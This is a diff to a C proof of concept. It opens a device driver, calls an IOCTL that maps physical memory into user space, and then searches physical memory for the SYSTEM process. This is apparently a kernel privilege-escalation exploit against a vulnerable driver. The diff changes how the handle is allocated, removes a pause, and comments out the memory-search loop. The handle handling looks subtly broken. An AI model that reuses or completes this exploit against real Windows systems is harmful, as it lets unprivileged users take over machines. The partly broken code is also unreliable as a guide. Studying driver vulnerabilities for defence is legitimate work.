@@ -12,7 +12,6 @@
 int main(char argc, char** argv)
 {
 	HANDLE device = INVALID_HANDLE_VALUE;
-	HANDLE hPhysicalMemory = NULL;
 	NTSTATUS status = FALSE;
 
 	DWORD bytesReturned = 0;
@@ -46,22 +45,25 @@ int main(char argc, char** argv)
 		fprintf(stderr, "> Could not open device: 0x%X\n", GetLastError());
 		return FALSE;
 	}
-
+	HANDLE hPhysicalMemory = (HANDLE)calloc(1, sizeof(HANDLE));
+	if (hPhysicalMemory == NULL) {
+		fprintf(stderr, "calloc() failed");
+		return FALSE;
+	}
 	printf("[ ] Calling IOCTL_MapPhysicalMemoryToLinearSpace 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
-	status = DeviceIoControl(device, IOCTL_MapPhysicalMemoryToLinearSpace, &hPhysicalMemory, sizeof(hPhysicalMemory), &hPhysicalMemory, sizeof(hPhysicalMemory), &bytesReturned, (LPOVERLAPPED)NULL);
+	status = DeviceIoControl(device, IOCTL_MapPhysicalMemoryToLinearSpace, hPhysicalMemory, sizeof(hPhysicalMemory), hPhysicalMemory, sizeof(hPhysicalMemory), &bytesReturned, (LPOVERLAPPED)NULL);
 	if (status == FALSE) {
 		fprintf(stderr, "[!] IOCTL_MapPhysicalMemoryToLinearSpace failed with %X\n", status);
 		return EXIT_FAILURE;
 	}
 	printf("[+] Called IOCTL_MapPhysicalMemoryToLinearSpace successfully. 0x%X\n", IOCTL_MapPhysicalMemoryToLinearSpace);
 	printf("Handle for PhysicalMemory: 0x%p\n", hPhysicalMemory);
-	system("pause");
 
 	PVOID* buf = (PVOID*)malloc(0x1000);
 	if (buf == 0) {
 		exit(EXIT_FAILURE);
 	}
-
+	/*
 	printf("\n\nTrying to find SYSTEM in physical memory...\n");
 	for (int i = 0; i < memRegionsCount; i++) {
 		__int64 start = memRegion[i].address;
@@ -87,5 +89,6 @@ int main(char argc, char** argv)
 
 	CloseHandle(hPhysicalMemory);
 	CloseHandle(device);
+	*/
 	return EXIT_SUCCESS;
 }
